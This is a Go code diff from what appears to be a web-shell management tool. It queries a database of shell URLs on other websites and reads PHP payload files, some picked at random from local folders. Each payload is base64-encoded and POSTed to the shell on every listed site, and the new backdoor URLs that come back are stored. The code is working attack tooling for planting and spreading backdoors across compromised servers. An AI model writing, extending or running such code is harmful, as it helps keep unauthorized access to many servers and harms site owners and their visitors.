@@ -7,9 +7,12 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math/rand"
 	"net/http"
 	"net/url"
 	"os"
+	"path"
+	"path/filepath"
 	"strings"
 	"time"
 
@@ -23,10 +26,10 @@ type Resdata struct {
 	Url    []string
 }
 
-func Addtest() {
-
+func AddMin() {
+	time.Sleep(3 * time.Second)
 	var shells []model.Shell
-	if err := model.Db.Where("status = 1").Find(&shells).Error; err != nil {
+	if err := model.Db.Where("status = 0").Find(&shells).Error; err != nil {
 		log.Printf("Sitestatus: failed to query shells: %v", err)
 		return
 	}
@@ -38,18 +41,124 @@ func Addtest() {
 		fmt.Println("读取文件失败:", err)
 		return
 	}
+	filename := Getfile("min")
+	//更换
+	newData := bytes.ReplaceAll(data, []byte("#####"), filename)
 
-	newData := append([]byte("?>"), data...)
+	newData = append([]byte("?>"), newData...)
 	// 2. Base64 编码
 	encoded := base64.RawStdEncoding.EncodeToString(newData)
-	// 3. 组装 POST 表单数据：test=base64内容
-	form := url.Values{}
-	form.Set("test", encoded)
+	for _, k := range shells {
+		geturl, err := cleanURL(k.Maxurl)
+		if err != nil {
+			log.Println("url err:", err.Error())
+			continue
+		}
+		filename := geturl + k.Minurl
+		fmt.Println("filename :", filename)
+		body := postdata(filename, encoded)
+		var resdate Resdata
+		jsonrr := json.Unmarshal(body, &resdate)
+		if jsonrr != nil {
+			fmt.Println("jsonerr:", jsonrr.Error())
+			continue
+		}
+		if len(resdate.Url) > 1 {
+			//
+			fmt.Println("url: ", resdate.Url)
+			var addmins []model.ShellMin
+			for _, resurl := range resdate.Url {
+				var min model.ShellMin
+				min.ShellId = k.Id
+				min.Url = resurl
+				min.Addtime = int(time.Now().Unix())
+				min.Status = 1
+				addmins = append(addmins, min)
+			}
+			model.Db.Create(addmins)
+		}
+	}
 
+}
+
+func AddMax() {
+	time.Sleep(3 * time.Second)
+	var shells []model.Shell
+	if err := model.Db.Where("status = 0").Find(&shells).Error; err != nil {
+		log.Printf("Sitestatus: failed to query shells: %v", err)
+		return
+	}
+
+	filePath := "./php/bakmin.php" // 要读取的文件
+	// 1. 读取文件
+	data, err := os.ReadFile(filePath)
+	if err != nil {
+		fmt.Println("读取文件失败:", err)
+		return
+	}
+	filename := Getfile("max")
+	//更换
+	newData := bytes.ReplaceAll(data, []byte("#####"), filename)
+
+	newData = append([]byte("?>"), newData...)
+	// 2. Base64 编码
+	encoded := base64.RawStdEncoding.EncodeToString(newData)
+	for _, k := range shells {
+		geturl, err := cleanURL(k.Maxurl)
+		if err != nil {
+			log.Println("url err:", err.Error())
+			continue
+		}
+		filename := geturl + k.Minurl
+		fmt.Println("filename :", filename)
+		body := postdata(filename, encoded)
+		var resdate Resdata
+		jsonrr := json.Unmarshal(body, &resdate)
+		if jsonrr != nil {
+			fmt.Println("jsonerr:", jsonrr.Error())
+			continue
+		}
+		if len(resdate.Url) > 1 {
+			//
+			fmt.Println("url: ", resdate.Url)
+			var addmins []model.ShellMax
+			for _, resurl := range resdate.Url {
+				var min model.ShellMax
+				min.ShellId = k.Id
+				min.Url = resurl
+				min.Addtime = int(time.Now().Unix())
+				min.Status = 1
+				addmins = append(addmins, min)
+			}
+			model.Db.Create(addmins)
+		}
+	}
+
+}
+
+func cleanURL(raw string) (string, error) {
+	u, err := url.Parse(raw)
+	if err != nil {
+		return "", err
+	}
+
+	// 去掉 query
+	u.RawQuery = ""
+
+	// 去掉文件名，保留目录
+	u.Path = path.Dir(u.Path)
+
+	return u.String(), nil
+}
+
+func postdata(urls string, data string) (body []byte) {
+	//urls := "http://127.0.0.107/admin.php"
+	form := url.Values{}
+	form.Set("test", data)
 	// 4. 创建请求
 	req, err := http.NewRequest(
 		"POST",
-		"http://127.0.0.107/admin.php",
+		urls,
 		bytes.NewBufferString(form.Encode()),
 	)
 	if err != nil {
@@ -73,16 +182,47 @@ func Addtest() {
 	defer resp.Body.Close()
 
 	// 7. 读取返回
-	body, _ := io.ReadAll(resp.Body)
-	var resdate Resdata
-	jsonrr := json.Unmarshal(body, &resdate)
-	if jsonrr != nil {
-		fmt.Println("jsonrr:", jsonrr.Error())
+	body, _ = io.ReadAll(resp.Body)
+	return
+}
+
+func Getfile(mmtype string) (data []byte) {
+	dir := "./php/max"
+	if mmtype == "min" {
+		dir = "./php/min"
 	}
-	if len(resdate.Url) > 1 {
-		//
-		fmt.Println("url: ", resdate.Url)
+	var files []string
+
+	// 遍历目录
+	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
+		if err != nil {
+			return err
+		}
+		if !info.IsDir() {
+			files = append(files, path)
+		}
+		return nil
+	})
+
+	if err != nil {
+		panic(err)
 	}
+
+	if len(files) == 0 {
+		fmt.Println("没有文件")
+		return
+	}
+	// 随机种子
+	rand.New(rand.NewSource(time.Now().UnixNano()))
+	randomFile := files[rand.Intn(len(files))]
+
+	fmt.Println("随机文件:", randomFile)
+
+	data, err = os.ReadFile(randomFile)
+	if err != nil {
+		panic(err)
+	}
+	return
 
 }
 
